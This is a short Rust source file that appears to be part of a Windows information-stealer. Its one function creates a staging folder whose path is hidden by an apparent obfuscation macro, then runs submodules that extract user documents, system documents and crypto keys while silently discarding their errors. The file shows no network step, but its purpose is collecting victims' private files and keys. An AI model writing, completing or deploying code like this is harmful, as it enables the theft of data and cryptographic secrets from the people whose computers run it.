use crate::sprotect;
use std::fs;
use std::process::Command;

pub async fn extract_all_documents() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\docs");
    fs::create_dir_all(&output_dir)?;
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }
    
    crate::docs::user_docs::extract_user_documents().await.ok();
    crate::docs::system_docs::extract_system_documents().await.ok();
    crate::docs::crypto_keys::extract_crypto_keys().await.ok();
    
    Ok(())
}